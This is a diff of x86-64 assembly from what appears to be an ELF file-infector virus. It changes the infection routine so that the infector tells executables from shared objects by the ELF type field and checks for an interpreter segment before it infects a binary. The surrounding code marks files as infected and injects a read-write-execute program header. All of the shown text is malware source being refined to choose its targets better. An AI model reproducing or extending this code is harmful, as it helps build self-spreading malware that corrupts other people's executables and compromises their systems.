@@ -420,7 +420,7 @@ print_rax:
 		push	rdx
 
 		lea		rsi, [rel path]
-		;call	printf here
+		call	printf ;here
 		lea		rdi, [rel buff]
 		mov		rcx, 512
 		xor		rax, rax
@@ -663,9 +663,12 @@ prepare_infection:
 	; check infected
 	cmp byte [r14 + 0xa], 0x0
 	jne .close_file
+	mov	BYTE [rel dynm], 0
+	
 
 	cmp	byte [r14 + 0x10], 0x02
 	je	.continue_infection
+	mov	BYTE [rel dynm], 1
 	cmp	byte [r14 + 0x10], 0x03
 	je	.continue_infection
 
@@ -706,7 +709,7 @@ prepare_infection:
 
 infection:
 	PUSH_ALLr
-
+	mov BYTE [rel inte], 0
 	mov BYTE [rel zero], 1
 	mov qword [rel p_offset], 0
 	mov qword [rel p_vaddr], 0
@@ -733,7 +736,10 @@ infection:
 	pop rcx
 	pop r11
 	inc r8
-
+	cmp dword [rbx], 3
+	jne	.no_interp
+	mov BYTE [rel inte], 1
+.no_interp:
 	cmp dword [rbx], 1
 	jne .no_load
 
@@ -777,6 +783,13 @@ infection:
 	dec rcx
 	jnz .loop
 
+
+	cmp BYTE [rel dynm], 0
+	je	.no_check_dynm
+	cmp BYTE [rel inte], 0
+	je	.return
+
+.no_check_dynm:
 	cmp r13, 1
 	je	.return
 
@@ -1203,6 +1216,8 @@ _stop:
 		db 0x4d, 0x29, 0xff, 0x90, 0x90, 0x90, 0x90     ; sub r15, r15
 		db 0x49, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and r15, 0
 ; NEW HEADER
+	dynm:	db 0
+	inte:	db 0
 new_programheader:
 	p_type		dd	1
 	p_flags		dd	7
